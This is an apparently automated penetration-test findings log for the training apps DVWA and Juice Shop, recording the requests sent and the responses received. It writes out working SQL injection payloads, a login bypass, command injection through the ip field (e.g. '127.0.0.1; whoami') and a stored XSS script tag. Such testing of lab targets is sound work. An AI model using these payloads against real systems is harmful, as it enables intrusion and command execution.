findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 records: 'ID: 1' OR '1'='1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. findings.title: DVWA OS Command Injection (ip parameter) [security=low]
request_sequence: POST /vulnerabilities/exec/ body: ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin, security=low)
findings.response_evidence: [security=low] HTTP 200. Ping output for 127.0.0.1 (4 packets, 0% loss) followed directly by the line 'www-data' before 'More Information', confirming injected whoami executed as the web-process identity www-data.

findings.title: Juice Shop login authentication bypass via SQL injection in email field
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user admin@juice-sh.op without valid credentials (the prior invalid-credential attempt returned 401), confirming login SQL injection bypass.

findings.title: DVWA Stored XSS in guestbook message (security=low)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin, security=low) form: txtName=test, mtxMessage=<script id="test_token">window.xss_flag=1</script> (50 chars, matches maxlength), btnSign=Sign Guestbook
findings.response_evidence: [security=low] POST returned 200 and the stored entry rendered with the raw script tag in the guestbook (name 'test', message containing <script id="test_token">window.xss_flag=1</script>; script text not visible in visible_text, consistent with script element). After browser_navigate to /vulnerabilities/xss_s/ in dvwa_admin session, browser_eval_js("String(window.xss_flag)") returned "1". Guestbook was cleared afterward (btnClear), which also removed the pre-existing seeded 'test' entry. Note: no user_token field was present on this form in this DVWA build.

findings.title: Product-Search SQL Injection (q parameter) - error-based and UNION-based
findings.response_evidence: Benign q=apple: HTTP 200, no error, 2 real product records. Single quote q=qwert': HTTP 500 with body 'Error: SQLITE_ERROR: near "'%'": syntax error'. UNION probe q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} - the injected constant values are reflected in the product fields, proving attacker-controlled UNION column output from the SQLite query.

findings.title: Unauthenticated access to user feedback records with partially masked author emails
findings.response_evidence: Unauthenticated GET /api/Feedbacks returned HTTP 200 with 8 records (UserId, id, comment, rating, createdAt, updatedAt) without any authentication, so the unauthenticated-access part holds. However, author emails appear only as masked fragments embedded in comment text, e.g. "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)". Full author email addresses are not disclosed; the UserId field is a numeric ID with no email field. Records with null UserId show "(anonymous)". Because the criteria require disclosure of author email addresses, and the data shows only partial masked fragments (domain and a few trailing local-part characters), this is classed as inconclusive rather than confirmed PII exposure. Partial PII leakage is present and should be reviewed by the coordinator.

findings.title: DVWA security.php: state change without anti-CSRF token rejected (not exploitable)
request_sequence: GET http://dvwa/security.php (unauth) -> 302 redirect to login.php (page not exposed to unauthenticated sessions)
POST http://dvwa/security.php (dvwa_admin) form security=low, seclev_submit=Submit, NO user_token -> 302 back to security.php
findings.response_evidence: Unauthenticated GET /security.php returns 302 to login.php, so the current level is not disclosed to unauthenticated sessions. POST without user_token was not accepted as a state change: the follow-up page rendered the flash message "CSRF token is incorrect", and it still reads "Security level is currently: low". Token validation is enforced; the endpoint behaves as a normal protected form. No weakness demonstrated. The security level was not changed (submitted value equalled current level); DVWA remains at low.

findings.title: Unauthenticated /api/Feedbacks: author emails masked, no full PII disclosed
findings.response_evidence: Unauthenticated 200 with 8 feedback records (UserId, id, comment, rating, createdAt, updatedAt). Author attribution is only embedded in comment text and is masked, e.g. "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)"; remaining records are "(anonymous)" or have UserId null. No full author email address is disclosed. Partial masking leaks only fragments of the local part and the domain; this does not meet the criterion of disclosing author email addresses (PII). Verdict: rejected for CWE-359 at this endpoint. Note: UserId integers are exposed, which is a minor information exposure only.

findings.title: DVWA OS Command Injection via pipe without trailing space bypass [security=high]

findings.response_evidence: [security=high] Page body after POST ip=127.0.0.1|whoami shows 'Ping a device ... www-data' and 'Security Level: high'. Output 'www-data' is the web-process identity. findings.title: DVWA Stored XSS canary blocked at security=high (guestbook message)
findings.response_evidence: [security=high] The canary POST response renders the stored message as 'Message: window.xss_flag=1' - the <script id="test_token"> tags were stripped server-side. In the browser DOM, document.querySelectorAll('script#test_token').length = 0 and window.xss_flag evaluates to undefined (not 1). Canary blocked at high, so no confirmed high-level bypass. Note: browser page body reported 'Security Level: low' while the http page reported 'Security Level: high' on the same session; server-side level was high on the authoritative http check. The low-level XSS instance remains the separately confirmed finding.

POST http://dvwa/vulnerabilities/sqli/ session=dvwa_admin body: id=1 OR 1=1&Submit=Submit (TRUE)
POST http://dvwa/vulnerabilities/sqli/ session=dvwa_admin body: id=1 AND 1=2&Submit=Submit (FALSE)
findings.response_evidence: [security=medium] Security level confirmed from page body: 'Security Level: medium'. (Note: the tool's session_info field reported security_level 'low' on all three responses, which conflicts with the page body; the page body was treated as authoritative.) TRUE payload id=1 OR 1=1 returned HTTP 200 with 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1 AND 1=2 returned HTTP 200 with zero records (no 'ID:/First name:/Surname:' rows; only the static 'User ID: 1 2 3 4 5' dropdown text). Multiple seeded surnames under TRUE and zero under FALSE satisfies the criteria.

findings.response_evidence: HTTP 200 application/json: {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":...,"updatedAt":...,"deletedAt":null},...]}. findings.title: Unauthenticated product reviews disclose author email addresses (PII)
findings.response_evidence: HTTP 200 application/json without any credentials: {"status":"success","data":[{"message":"One of my favorites!","author":"admin@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"2w3FNBAW9k7ybcxcP","liked":true}]}. findings.title: Unauthenticated challenge list (public-by-design metadata)
findings.response_evidence: HTTP 200 JSON {"status":"success","data":[{"id":1,"key":"restfulXssChallenge","name":"API-only XSS","category":"XSS","hint":"...","solved":false,...},...]}. Content is challenge metadata only (names, categories, difficulty, hints, solved flags, hint/mitigation URLs). No user data, credentials, tokens, or other sensitive records were observed. This is public-by-design scoreboard data, so it does not meet the CWE-200 sensitive-disclosure bar.

findings.title: Unauthenticated whoami returns no identity
findings.response_evidence: HTTP 200 application/json: {"user":{}}. No user identity, email, id, or token is disclosed to an unauthenticated caller, so there is no cross-user identity or token exposure.

findings.title: Unauthenticated User-Feedback PII Exposure on GET /api/Feedbacks
findings.response_evidence: HTTP 200 without authentication, 8 feedback records returned. Author emails are masked in every record, e.g. comment ending \"(***in@juice-sh.op)\", \"(***@juice-sh.op)\", \"(***der@juice-sh.op)\", \"(***ereum@juice-sh.op)\". Anonymous records have UserId null and \"(anonymous)\". No full, unmasked author email addresses are disclosed, so the CWE-359 criterion (PII disclosure) is not met. Rejected.
